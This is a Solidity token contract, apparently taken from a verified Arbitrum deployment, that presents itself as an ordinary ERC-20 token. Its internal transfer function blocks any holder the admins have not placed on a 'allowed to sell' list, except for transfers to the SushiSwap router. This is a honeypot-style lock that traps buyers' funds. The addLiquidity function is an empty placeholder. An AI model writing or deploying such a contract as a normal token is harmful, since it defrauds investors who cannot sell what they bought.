/**
 *Submitted for verification at Arbiscan.io on 2024-06-14
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MyToken {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address private _owner;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isAdmin;
    mapping(address => bool) private _isAllowedToSell;
    address private _sushiRouter;
    bool private _liquidityAdded;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_,
        address owner_,
        address sushiRouter_
    ) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_;
        _owner = owner_;
        _balances[owner_] = totalSupply_;
        _isAdmin[owner_] = true;
        _isAllowedToSell[owner_] = false;
        _sushiRouter = sushiRouter_;
        _liquidityAdded = false;
        emit Transfer(address(0), owner_, totalSupply_);
    }

    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    modifier onlyAdmin() {
        require(_isAdmin[msg.sender], "Permission: caller is not an admin");
        _;
    }

    modifier onlyAllowedToSell() {
        require(_isAllowedToSell[msg.sender], "Permission: caller is not allowed to sell");
        _;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        _transfer(sender, recipient, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender] - subtractedValue
        );
        return true;
    }

    function addLiquidity() external onlyAdmin {
        require(!_liquidityAdded, "Liquidity: liquidity already added");
        // Add liquidity logic with SushiSwap
        _liquidityAdded = true;
    }

    function allowToSell(address account) external onlyAdmin {
        _isAllowedToSell[account] = true;
    }

    function disallowToSell(address account) external onlyAdmin {
        _isAllowedToSell[account] = false;
    }

    function grantAdmin(address account) external onlyOwner {
        _isAdmin[account] = true;
    }

    function revokeAdmin(address account) external onlyOwner {
        _isAdmin[account] = false;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "Approval: approve from the zero address");
        require(spender != address(0), "Approval: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "Transfer: transfer from the zero address");
        require(recipient != address(0), "Transfer: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(
            _balances[sender] >= amount,
            "Transfer: transfer amount exceeds balance"
        );
        require(
            _isAllowedToSell[sender] || recipient == _sushiRouter,
            "Transfer: sender is not allowed to sell"
        );

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
}